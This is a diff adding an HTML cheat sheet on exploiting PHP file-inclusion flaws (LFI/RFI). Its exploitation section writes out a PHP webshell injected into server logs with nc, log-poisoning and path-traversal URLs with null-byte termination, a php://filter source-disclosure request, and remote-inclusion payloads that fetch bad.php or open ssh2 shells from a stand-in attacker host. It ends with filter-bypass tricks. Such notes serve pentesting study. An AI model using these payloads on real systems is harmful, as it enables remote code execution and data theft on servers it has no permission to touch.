@@ -1,0 +1,85 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>LFI/RFI</title>
+</head><body><b><span style="font-size: 12pt">DETECTION<br/>
+</span></b><br/>
+<b>General</b><br/>
+<br/>
+Terminate parameters with NULL string %00 (PHP &lt; 5.3)<br/>
+PHP &gt;=5.2 have a new option, <tt>allow_url_include</tt>, which is disabled by default<b><span style="font-size: 12pt"><br/>
+</span></b><b><span style="font-size: 12pt"><br/>
+</span></b><b><span style="font-size: 10pt">RFI</span></b><span style="font-size: 12pt"><br/>
+</span><span style="font-size: 12pt"><br/>
+</span>1. Submit in each targeted parameter a URL for a resource on a web server that you control<br/>
+If possible check web logs for incoming requests<br/>
+<br/>
+2. Submit a URL containing a nonexistent IP address, and determine whether a timeout occurs<br/>
+<br/>
+<b>Common parameter names</b><br/>
+<tt><br/>
+File=<br/>
+document=<br/>
+Folder=<br/>
+root=<br/>
+Path=<br/>
+pg=<br/>
+style=<br/>
+pdf=<br/>
+template=<br/>
+php_path=<br/>
+</tt><tt>doc=</tt><br/>
+<br/>
+<b>L<span style="font-size: 10pt">FI</span><br/>
+<br/>
+</b>Submit the name of a known executable resource on the server<br/>
+Submit the name of a known static resource on the server<span style="font-size: 12pt"><b><br/>
+</b></span><span style="font-size: 12pt"><b><br/>
+</b><b>EXPLOITATION</b><br/>
+</span><span style="font-size: 10pt"><br/>
+<b>RFI</b><br/>
+<br/>
+Construct webshell script in correct language and RFI it<br/>
+<br/>
+</span><b>Contaminating log files (check all available services for log file LFI not just apache)<br/>
+</b><tt><br/>
+</tt><tt>nc -nv 10.11.1.35 80</tt><br/>
+<tt>&lt;?php echo shell_exec($_GET['cmd']);?&gt;<br/>
+</tt><br/>
+Find the log directory for given apache server (c:\xampp\apache\logs\access.log)<br/>
+Execute command with<br/>
+<tt>http://10.11.1.35/addguestbook.php?name=a&amp;comment=b&amp;<b>cmd=ipconfig</b>&amp;LANG=<b>../../../../../../../xampp/apache/logs/access.log%00</b></tt><br/>
+<br/>
+<b>LFI PHP file (server outputs php script as text file)</b><tt><br/>
+</tt><tt><br/>
+</tt><tt>http://192.168.1.65/?page=php://filter/convert.base64-encode/resource=index</tt><br/>
+<br/>
+<b>RFI if <tt>allow_url_fopen</tt>enabled</b><br/>
+<tt><br/>
+http://wahh-attacker.com/bad.php<br/>
+ftp://user:password@wahh-attacker.com/bad.php<br/>
+ssh2.shell://user:pass@wahh-attacker.com:22/xterm<br/>
+</tt><tt>ssh2.exec://user:pass@wahh-attacker.com:22/cmd</tt><br/>
+<b><br/>
+</b><b>RFI if <tt>allow_url_fopen</tt>disabled</b><br/>
+<tt><br/>
+\\wahh-attacker.com\bad.php (SMB)<br/>
+php://filter/resource=http://wahh-attacker.com/bad.php<br/>
+compress.zlib://http://wahh-attacker.com/bad.php<br/>
+</tt><tt>ogg://http://wahh-attacker.com/bad.php</tt><br/>
+<br/>
+<b>Advanced methods</b><br/>
+<tt><br/>
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal<br/>
+<br/>
+</tt><b>Filter bypass</b><br/>
+<br/>
+escape &quot;/&quot; with &quot;\/&quot; or &quot;//&quot; with &quot;\/\/&quot;<br/>
+try single &quot;/&quot; instead of &quot;//&quot;<br/>
+remove http i.e. &quot;continue=//google.com&quot;<br/>
+&quot;/\/\&quot; , &quot;|/&quot; , &quot;/%09/&quot;<br/>
+encode, slashes<br/>
+&quot;./&quot; CHANGE TO &quot;..//&quot;<br/>
+&quot;../&quot; CHANGE TO &quot;....//&quot;<br/>
+&quot;/&quot; CHANGE TO &quot;//&quot;<br/>
+</body></html>
